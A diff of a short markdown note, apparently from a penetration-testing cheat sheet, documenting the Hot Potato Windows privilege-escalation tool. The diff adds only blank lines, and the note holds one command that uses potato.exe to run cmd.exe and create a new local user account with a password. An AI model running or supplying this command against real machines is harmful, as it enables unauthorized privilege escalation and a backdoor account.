@@ -9,9 +9,17 @@ updated_at: '2023-05-29T16:48:52.690130+00:00'
 
 # potato.exe
 
+
+
 **Command** ([[hot potato usage]]):
 
 ```bash
 potato.exe -ip <local ip> -cmd "c:\\windows\\system32\\cmd.exe /K net users username password /add" -disable_exhaust true
 
 ```
+
+
+
+
+
+
